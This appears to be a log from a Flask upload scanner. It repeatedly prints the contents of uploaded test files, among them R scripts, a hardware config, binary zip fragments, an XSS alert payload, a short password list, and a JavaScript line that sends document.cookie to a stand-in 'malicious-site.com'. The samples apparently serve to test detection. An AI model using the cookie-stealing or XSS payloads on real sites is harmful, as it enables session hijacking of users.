 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:07:43,229 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,231 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,232 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,233 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,235 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,236 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,237 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,238 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,239 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,241 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,242 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,243 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,244 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,246 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,248 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,250 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,251 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,253 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,254 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,258 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,259 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,261 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,263 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,264 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,266 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,267 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,269 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,270 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,271 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,274 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,275 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,276 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,277 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,278 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,280 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,281 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,282 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,283 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,285 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,286 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,287 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,288 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,290 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,291 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,292 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,293 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,300 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,303 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,304 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,307 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,308 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,310 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,312 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,313 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,317 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,319 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,321 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,323 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,325 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,327 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,329 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,330 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,332 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,334 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,337 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,338 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,340 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,342 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,344 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,347 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,349 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,352 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,353 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,357 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,359 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,361 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:43,363 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:43,366 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:43,369 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:43,371 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,373 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

